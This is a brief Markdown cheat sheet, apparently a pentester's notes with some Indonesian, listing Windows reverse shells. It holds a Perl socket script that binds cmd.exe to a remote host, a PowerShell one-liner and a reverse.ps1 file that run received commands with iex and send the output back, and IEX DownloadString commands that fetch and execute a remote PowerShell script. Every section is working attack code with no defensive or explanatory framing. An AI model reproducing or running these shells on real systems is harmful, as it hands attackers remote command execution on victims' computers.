# Windows Reverse Shell
# Trigger any ps1 file

## Perl
```
#!perl -w

use Socket;
$i="192.168.1.8";
$p=1234;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
	open(STDOUT,">&S");
	open(STDERR,">&S");
	exec("cmd.exe");
	system("start cmd.exe /k $cmd");
};
```
## Powershell
```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Powershell File ps.1
### reverse.ps1
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

# Trigger any ps1 file
```
c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3/powershell_reverse_shell.ps1')

Lokasi lainnya :
C:\Windows\System32\WindowsPowerShell\v1.0\xxx
C:\Windows\SysWow64\WindowsPowerShell\v1.0\xxx


or

powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3/powershell_reverse_shell.ps1')
```